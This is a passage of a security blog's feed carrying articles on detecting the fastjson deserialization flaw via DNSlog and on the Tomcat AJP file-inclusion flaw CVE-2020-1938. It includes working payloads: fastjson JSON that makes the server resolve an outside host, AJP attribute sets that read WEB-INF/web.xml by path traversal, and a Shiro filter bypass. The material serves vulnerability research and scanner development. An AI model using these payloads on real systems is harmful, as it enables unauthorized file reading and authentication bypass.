(InetAddress)parser.parseObject(InetAddress.class);</span><br><span class="line">                    &#125; </span><br><span class="line">                    ...</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>parser.parseObject(InetAddress.class)</code>最终依然会，调用<code>MiscCodec#deserialze()</code>方法来序列化，这里就来到我们构造payload的第二步。第二步的目标是要让解析器走到<code>InetAddress.getByName(strVal)</code>。解析器要接受的字符在代码里标好了，按照顺序写就是<code>,&quot;val&quot;:&quot;http://dnslog&quot;}</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.alibaba.fastjson.serializer.MiscCodec#deserialze</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;</span><br><span class="line">        JSONLexer lexer = parser.lexer;</span><br><span class="line">        String className;</span><br><span class="line">        <span class="comment">// 序列化的是InetAddress.class类，走else流程</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == InetSocketAddress.class) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Object objVal;</span><br><span class="line">            <span class="keyword">if</span> (parser.resolveStatus == <span class="number">2</span>) &#123;</span><br><span class="line">                parser.resolveStatus = <span class="number">0</span>;</span><br><span class="line">                <span class="comment">// 16 ---&gt; ,</span></span><br><span class="line">                parser.accept(<span class="number">16</span>);</span><br><span class="line">                <span class="keyword">if</span> (lexer.token() != <span class="number">4</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 字段名 ---&gt; val</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">"val"</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                lexer.nextToken();</span><br><span class="line">                <span class="comment">// 17 ---&gt; :</span></span><br><span class="line">                parser.accept(<span class="number">17</span>);</span><br><span class="line">                <span class="comment">// 之后解析为对象,也就是val字段对应的值</span></span><br><span class="line">                objVal = parser.parse();</span><br><span class="line">                <span class="comment">// 13 ---&gt; &#125;</span></span><br><span class="line">                parser.accept(<span class="number">13</span>);</span><br><span class="line">            &#125; </span><br><span class="line">            ....</span><br><span class="line">           <span class="comment">// 后续的流程和方法一一样了，进行类型判断</span></span><br><span class="line">           strVal = (String)objVal;</span><br><span class="line">           <span class="keyword">if</span> (strVal != <span class="keyword">null</span> &amp;&amp; strVal.length() != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz == UUID.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz == URI.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz == URL.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz != InetAddress.class &amp;&amp; clazz != Inet4Address.class &amp;&amp; clazz != Inet6Address.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 域名解析</span></span><br><span class="line">                    <span class="keyword">return</span> InetAddress.getByName(strVal);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (UnknownHostException var11) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"deserialize inet adress error"</span>, var11);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两段合起来就得到了最终的payload。</p><h2 id="0x04-方法三-利用java-net-URL"><a href="#0x04-方法三-利用java-net-URL" class="headerlink" title="0x04 方法三:利用java.net.URL"></a>0x04 方法三:利用java.net.URL</h2><p><code>java.net.URL</code>类也在<code>IdentityHashMap</code>中，和上面一样无视<code>checkAutoType</code>检查。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;"@type":"java.net.URL","val":"http://dnslog"&#125;:"x"&#125;</span><br></pre></td></tr></table></figure><p>来源于<code>@retanoj</code>和<code>@threedr3am</code>两位师傅的启发,其原理和ysoserial中的<code>URLDNS</code>这个gadget原理一样。</p><p><strong>简单来说就是向HashMap压入一个键值对时，HashMap需要获取key对象的hashcode。当key对象是一个URL对象时，在获取它的<code>hashcode</code>期间会调用<code>getHostAddress</code>方法获取host，这个过程域名会被解析。</strong></p><p><img src="/articles/2020/several-ways-to-detect-fastjson-through-dnslog/2.png" alt="URL对象hashcode的获取过程"></p><p>fastjson解析上述payload时，先反序列化出<code>URL(http://dnslog)</code>对象，然后将<code>{URL(http://dnslog):&quot;x&quot;}</code>解析为一个HashMap,域名被解析。</p><p><code>@retanoj</code>在<a href="https://github.com/alibaba/fastjson/issues/3077" target="_blank" rel="noopener">Issue</a>中还构造了好几个畸形的payload，虽然原理都是一样的,但还是挺有意思的,感受到了师傅对fastjson词法分析器透彻的理解。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;"@type":"com.alibaba.fastjson.JSONObject", &#123;"@type": "java.net.URL", "val":"http://dnslog"&#125;&#125;""&#125;</span><br><span class="line">Set[&#123;"@type":"java.net.URL","val":"http://dnslog"&#125;]</span><br><span class="line">Set[&#123;"@type":"java.net.URL","val":"http://dnslog"&#125;</span><br><span class="line">&#123;&#123;"@type":"java.net.URL","val":"http://dnslog"&#125;:0</span><br></pre></td></tr></table></figure><h2 id="0x05-留一个问题"><a href="#0x05-留一个问题" class="headerlink" title="0x05 留一个问题"></a>0x05 留一个问题</h2><p>最后留个问题吧，我们都知道一般影响fastjson的gadget也会影响jackson。那么我们上面构造的payload，使用相同的原理能在jackson实现么？如果能，又该怎么构造呢？欢迎在blog留言区分享你的思考。</p><h2 id="0x06-参考文献"><a href="#0x06-参考文献" class="headerlink" title="0x06 参考文献"></a>0x06 参考文献</h2><ul><li><a href="https://github.com/alibaba/fastjson/issues/3077" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/issues/3077</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-背景&quot;&gt;&lt;a href=&quot;#0x01-背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景&quot;&gt;&lt;/a&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;在渗透测试中遇到json数据一般都会测试下有没有反序列化。然而json库有&lt;code&gt;fastjso
      
    
    </summary>
    
      <category term="安全研究" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="fastjson" scheme="http://gv7.me/tags/fastjson/"/>
    
  </entry>
  
  <entry>
    <title>如何更加精确的检测Tomcat AJP文件包含漏洞(CVE-2020-1938)</title>
    <link href="http://gv7.me/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/"/>
    <id>http://gv7.me/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/</id>
    <published>2020-03-18T13:14:55.000Z</published>
    <updated>2020-03-27T12:21:54.085Z</updated>
    
    <content type="html"><![CDATA[<p>通过上篇文章<a href="http://gv7.me/articles/2020/cve-2020-1938-tomcat-ajp-lfi/">《CVE-2020-1938:Tomcat AJP协议文件包含漏洞分析》</a>，我们知道这个漏洞出现在Tomcat默认的两个<code>Servlet</code>，一个是<code>DefaultServelt</code>，可以任意文件读取。第二个是<code>JspServlet</code>，可以用于文件读取和代码执行。所以我们漏洞利用的关键是让精心构造的数据包最终让这两个<code>Servlet</code>处理。但是在真实环境下的Web项目情况很复杂，会添加自定义的<code>Servlet</code>和<code>Filter</code>，使用各种框架和组件。它们的<code>Servlet</code>和<code>Filter</code>匹配规则会影响我们构造的数据包处理流向，导致我们无法检查成功。本文我们会针对常见的5种情况进行分析并一一解决！</p><h2 id="0x01-知识储备"><a href="#0x01-知识储备" class="headerlink" title="0x01 知识储备"></a>0x01 知识储备</h2><p>在分析前我们需要对Tomcat匹配规则优先级有一个了解，匹配的优先级如下，优先级从上到下：</p><ol><li>精确匹配（例如：<code>/admin/index.html</code>）</li><li>路径匹配 (例如：/*)</li><li>拓展名匹配 (例如：<code>*.jsp</code>,<code>*.jspx</code>)</li><li>缺省匹配 （比如:<code>/</code>）</li></ol><p>具体的匹配细节可以查看Tomcat源码<code>org.apache.catalina.mapper.Mapper#internalMapWrapper()</code></p><h2 id="0x02-情况一：原生Servlet环境下"><a href="#0x02-情况一：原生Servlet环境下" class="headerlink" title="0x02 情况一：原生Servlet环境下"></a>0x02 情况一：原生Servlet环境下</h2><p>Tomcat下存在多个默认的web项目，由于它们没有使用任何框架，所以借助它们来检查再好不过了。</p><ul><li>docs</li><li>examples</li><li>host-manager</li><li>manager</li></ul><p>当没有默认的web项目，我们只能检查<code>ROOT</code>下的项目了。在使用原生Servlet开发的web应用中，我们要考虑的是开发人员自定义<code>filter</code>和自定义<code>servlet</code>对漏洞影响。</p><p>按照开发经验，一般过滤器是不会过滤<code>.js</code>,<code>.css</code>,<code>.ico</code>等静态文件后缀的url，同时自定义的Servlet也不会去处理这些url。所以我们可以构造类似如下请求来绕过它们带来的影响。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RequestUri：/facvon.ico</span><br><span class="line">javax.servlet.include.request_uri: /</span><br><span class="line">javax.servlet.include.path_info: WEB-INF/web.xml</span><br><span class="line">javax.servlet.include.servlet_path: /</span><br></pre></td></tr></table></figure><h2 id="0x03-情况二：Sping-mvc环境下"><a href="#0x03-情况二：Sping-mvc环境下" class="headerlink" title="0x03 情况二：Sping mvc环境下"></a>0x03 情况二：Sping mvc环境下</h2><p>Spring MVC的经典配置如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath*:spring-mvc-config.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>虽然覆盖掉了<code>DefaultServlet</code>的匹配路径，但是<code>*.jsp,*.jspx</code>依然会交给<code>JspServlet</code>处理，所以我们可以构造如下请求让JspServlet来触发漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RequestUri：/index.jsp</span><br><span class="line">javax.servlet.include.request_uri: /</span><br><span class="line">javax.servlet.include.path_info: WEB-INF/web.xml</span><br><span class="line">javax.servlet.include.servlet_path: /</span><br></pre></td></tr></table></figure><p>这里顺便回答下上一篇文章提的问题</p><p><strong>问题：如果已经知道某个contoller使用的是jsp为视图模版来渲染数据，我们能否通过它来触发漏洞？</strong></p><p>答：其实是不可以的。因为spring mvc会将模版渲染后，交给JspServlet去处理之前，会调用<code>org.apache.catalina.core.ApplicationDispatcher#doInclude</code>方法对3个include属性进行重新赋值，也就是把我们之前设置的值覆盖掉了不再可控！</p><p><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/1.png" alt="doInclude方法覆盖3个include属性"></p><h2 id="0x04-情况三：Spring-boot环境下"><a href="#0x04-情况三：Spring-boot环境下" class="headerlink" title="0x04 情况三：Spring boot环境下"></a>0x04 情况三：Spring boot环境下</h2><p>Srping boot结合Tomcat来部署有两种方式，分别是<code>外置</code>和<code>内嵌</code>。</p><h4 id="5-1-内嵌Tomcat"><a href="#5-1-内嵌Tomcat" class="headerlink" title="5.1 内嵌Tomcat"></a>5.1 内嵌Tomcat</h4><p>我们先来说内嵌，它是默认的部署方式。顾名思义就是spring boot内部代码来调用Tomcat提供Web服务。这种方式默认AJP是不开启的。</p><p>若开启AJP，<code>DefaultServlet</code>的匹配路径也会将<code>org.springframework.web.servlet.DispatcherServlet</code>覆盖，而<code>JspServlet</code>这个是没有被注册的，因为该类在<code>jasper.jar</code>中，Spring boot默认的依赖中没有。</p><p>这里值得一提的是有一种情况是可以触发漏洞的，当Spring boot需要以JSP为视图模版时，jasper.jar需要被引入。通过调试Spring boot发现会自动注册一个将<code>*.jsp</code>和<code>*.jspx</code>给<code>Jspservlet</code>的处理的<code>mapper</code>，具体参考以下两处源码。</p><p>org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory#prepareContext<br><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/2.png" alt="添加JspServlet"></p><p>org.springframework.boot.web.servlet.server.AbstractServletWebServerFactory#shouldRegisterJspServlet<br><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/3.png" alt="判断JspServlet类是否加载进来了"></p><h4 id="5-2-外置Tomcat"><a href="#5-2-外置Tomcat" class="headerlink" title="5.2 外置Tomcat"></a>5.2 外置Tomcat</h4><p>外置就是把<code>SpringBoot</code>项目打成war，部署到tomcat的webapps目录下。这种情况下的检测和Spirng MVC情况一样。</p><p>所以综合来看，内置情况下只有配置开启了<code>AJP</code>并引入了<code>jasper.jar</code>才可以被利用，这种情况较少。外置情况下可以直接利用，这种情况也较少。所以我认为Spring boot出现该漏洞的可能性不大。</p><h2 id="0x05-情况四：shiro环境下"><a href="#0x05-情况四：shiro环境下" class="headerlink" title="0x05 情况四：shiro环境下"></a>0x05 情况四：shiro环境下</h2><p>经典配置下shiro过滤器会对所有路径进行过滤，对url的访问权限有如下5个属性。</p><ul><li>anon: 无需认证即可访问</li><li>authc: 需要认证才可访问</li><li>user: 点击“记住我”功能可访问</li><li>perms: 拥有权限才可以访问</li><li>role: 拥有某个角色权限才能访问</li></ul><p>假设配置如下，在未登录情况下只能访问被配置为<code>anon</code>权限的<code>login.jsp</code>，访问其他链接都会302跳转至登录页面。所以只能请求这个页面来触发漏洞。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"shiroFilter"</span> <span class="attr">class</span>=<span class="string">"org.apache.shiro.spring.web.ShiroFilterFactoryBean"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"securityManager"</span> <span class="attr">ref</span>=<span class="string">"securityManager"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"loginUrl"</span> <span class="attr">value</span>=<span class="string">"/login"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"unauthorizedUrl"</span> <span class="attr">value</span>=<span class="string">"/refuse.html"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"filterChainDefinitions"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">            /logout = logout</span><br><span class="line">            /login.jsp = anon</span><br><span class="line">            /** = authc</span><br><span class="line">        <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"successUrl"</span> <span class="attr">value</span>=<span class="string">"/index"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但我们在自动化中如何发现被配置为<code>anon</code>权限的URL呢？实验室的<code>@背影</code>师傅给了一条很重要的提示，可以通过该漏洞设置request对象属性<code>shiroFilter: 1</code>来“关闭”shiro的拦截功能。</p><p>如果<code>request</code>对象的属性名<code>alreadyFilteredAttributeName</code>的值不为空，那么将直接交给<code>Tomcat</code>的<code>servlet</code>处理，相当于关闭了<code>shiro</code>的拦截！</p><p><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/4.png" alt="判断是否已经过滤"></p><p>alreadyFilteredAttributeName变量等于<code>shiro过滤器名</code> + <code>.FILTERED</code>。</p><p>通过查看代码发现<code>shiroFilter</code>其实是<code>web.xml</code>设置的<code>shiro</code>过滤器名，这是由开发人员自定义的，故带来了新的问题。若不知道<code>shiro</code>过滤器名怎么办呢？</p><p><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/5.png" alt="已过滤属性名"></p><p>通过调试<code>shiro</code>，发现请求会被上面说的5种权限过滤器，依次匹配并处理。最重要的是它们的名字固定！于是按照同样的方法，都给它们设置上已过滤flag，即可绕过shiro的限制。具体请求构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">RequestUri：/test.jsp</span><br><span class="line">javax.servlet.include.request_uri: /</span><br><span class="line">javax.servlet.include.path_info: WEB-INF/web.xml</span><br><span class="line">javax.servlet.include.servlet_path: /</span><br><span class="line">authc.FILTERED: 1</span><br><span class="line">user.FILTERED: 1</span><br><span class="line">perms.FILTERED: 1</span><br><span class="line">role.FILTERED: 1</span><br></pre></td></tr></table></figure><h2 id="0x06-情况五：Struts2环境下"><a href="#0x06-情况五：Struts2环境下" class="headerlink" title="0x06 情况五：Struts2环境下"></a>0x06 情况五：Struts2环境下</h2><p>以下分析的是Struts2 2.5.22</p><p>使用Struts2框架一般需要设置如下的全局过滤器</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该过滤器默认会将后缀为<code>空</code>和<code>.action</code>的URL请求，交给<code>Struts2</code>的<code>Action</code>处理，而其他后缀就交给Tomcat默认Servlet处理，漏洞利用需要让其走后者。</p><p><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/6.png" alt="通过URL获取mapping对象，决定后续处理流程"></p><p>然而在请求路径的获取上Struts2有别于其他环境，这是导致漏洞利用方式稍有不同。它通过<code>request</code>对象的<code>javax.servlet.include.servlet_path</code>属性获取，而不是<code>request.getServletPath()</code>。</p><p>org.apache.struts2.dispatcher.mapper.DefaultActionMapper#getUri()</p><p><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/7.png" alt="Struts2请求的Servlet路径是由javax.servlet.include.servlet_path属性决定"></p><p>所以我们在这里必须设置该属性值为非空非<code>.action</code>的后缀<code>test.jsp</code>,才能让Tomcat的<code>JspServlet</code>来处理。但是如果我们还是使用原来的方式读<code>/WEB-INF/web.xml</code>是行不通的，因为最终构造的路径如下是错误的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">= javax.servlet.include.servlet_path + javax.servlet.include.path_info</span><br><span class="line">= /test.jsp + &apos;/WEB-INF/web.xml&apos;</span><br><span class="line">= /test.jsp/WEB-INF/web.xml (路径错误)</span><br></pre></td></tr></table></figure><p>那我们能否将<code>javax.servlet.include.path_info</code>设置为<code>/../WEB-INF/web.xml</code>来吃掉<code>1.jsp</code>形成正确路径呢？答案是可以的！可能看过我之前漏洞分析文章的朋友会说，不是说路径里不能使用<code>../</code>进行跳目录么？其实是可以跳目录，只是不能跳出<code>webapps</code>而已。这里重新说明下路径校验函数<code>normalized()</code>的功能。</p><p><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/8.png" alt="normalized方法中和./和../的处理流程"></p><p>该方法的功能是中和掉路径中的<code>./</code>和<code>../</code>，比如<code>/a/.//b/../c</code>就会被中和为<code>/a/c</code>。如果最后依然存在<code>../</code>在开头，才会返回<code>null</code>，最终抛出非法路径的异常。</p><p>所以在<code>Struts2</code>框架下检测该漏洞，需要构造如下请求来绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RequestUri: /</span><br><span class="line">javax.servlet.include.request_uri: /</span><br><span class="line">javax.servlet.include.path_info: /../WEB-INF/web.xml</span><br><span class="line">javax.servlet.include.servlet_path: /1.jsp</span><br></pre></td></tr></table></figure><h2 id="0x07-扫描演示"><a href="#0x07-扫描演示" class="headerlink" title="0x07 扫描演示"></a>0x07 扫描演示</h2><p>最后便可以将以上各个场景的特点综合起来，编写扫描工具了。这里我搭建了SpringMVC + Shiro的环境进行演示。可以发现其他的url都重定向了，只有针对shiro构造的请求是200，并成功触发漏洞！</p><p><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/9.png" alt="扫描演示"></p><h2 id="0x08-最后的话"><a href="#0x08-最后的话" class="headerlink" title="0x08 最后的话"></a>0x08 最后的话</h2><ol><li>本文只对每种环境较新版本进行分析，所以提供的扫描方案不可能适配所有版本环境，算是对精确检测做一个抛砖引玉。</li><li>每种环境下的检测方案，只考虑使用Tomcat默认存在缺陷的两个Servlet（<code>JspServlet</code>和<code>DefaultServlet</code>）来检测，更完美的方案应该是去找每种环境下其他存在缺陷的Servlet。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;通过上篇文章&lt;a href=&quot;http://gv7.me/articles/2020/cve-2020-1938-tomcat-ajp-lfi/&quot;&gt;《CVE-2020-1938:Tomcat AJP协议文件包含漏洞分析》&lt;/a&gt;，我们知道这个漏洞出现在Tomcat默认的两个
      
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Tomcat" scheme="http://gv7.me/tags/Tomcat/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-1938:Tomcat AJP协议文件包含漏洞分析</title>
    <link href="http://gv7.me/articles/2020/cve-2020-1938-tomcat-ajp-lfi/"/>
    <id>http://gv7.me/articles/2020/cve-2020-1938-tomcat-ajp-lfi/</id>
    <published>2020-02-22T08:14:24.000Z</published>
    <updated>2020-02-22T09:48:33.455Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h2><p>Tomcat根据默认配置(<code>conf/server.xml</code>）启动两个连接器。一个是<code>HTTP Connector</code>默认监听<code>8080</code>端口处理HTTP请求，一个<code>AJP connector</code>默认<code>8009</code>端口处理AJP请求。Tomcat处理两个协议请求区别并不大，AJP协议相当于HTTP协议的二进制优化版。</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/7F9C15E2-870C-45ED-914E-61663896B504.png" alt="tomcat默认配置两个连接器"></p><p><strong>本次漏洞出现在通过设置AJP请求属性，可控制AJP连接器封装的request对象的属性，最终导致文件包含可以任意文件读取和代码执行。</strong> 下面我们以<code>Tomcat 8.5.47</code>来具体分析。</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>当我们向Tomcat发送AJP请求时，请求会被<code>org.apache.coyote.ajp.AjpProcessor</code>，<code>AjpProcessor</code>调用<code>prepareRequest</code>方法读取AJP请求中的信息来设置request属性。</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/61F07938-9006-4490-AC56-738540E76D23.png" alt="对request对象属性进行设置"></p><p>由于没有任何过滤，我们可以给<code>request</code>设置任何属性和值。本次漏洞与如下三个属性有关，为了方便后续描述统一简称为“<code>三个include属性</code>”。</p><ul><li>javax.servlet.include.request_uri</li><li>javax.servlet.include.path_info</li><li>javax.servlet.include.servlet_path</li></ul><p>最终会将封装好的<code>request</code>丢给<code>Servlet</code>容器<code>Catalina</code>处理，之后就和HTTP消息的处理一样，按照Servlet映射走。</p><h4 id="2-1-任意文件读取"><a href="#2-1-任意文件读取" class="headerlink" title="2.1 任意文件读取"></a>2.1 任意文件读取</h4><p>任意文件读取问题出现在<code>org.apache.catalina.servlets.DefaultServlet</code>这个Servlet。现在假设我们发出一个请求内容如下的AJP请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RequestUri：/docs/test.jpg</span><br><span class="line">javax.servlet.include.request_uri: /</span><br><span class="line">javax.servlet.include.path_info: WEB-INF/web.xml</span><br><span class="line">javax.servlet.include.servlet_path: /</span><br></pre></td></tr></table></figure><p>通过查看servlet映射规则(<code>conf/web.xml</code>)知道，请求会走默认的<code>DefaultServlet</code>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 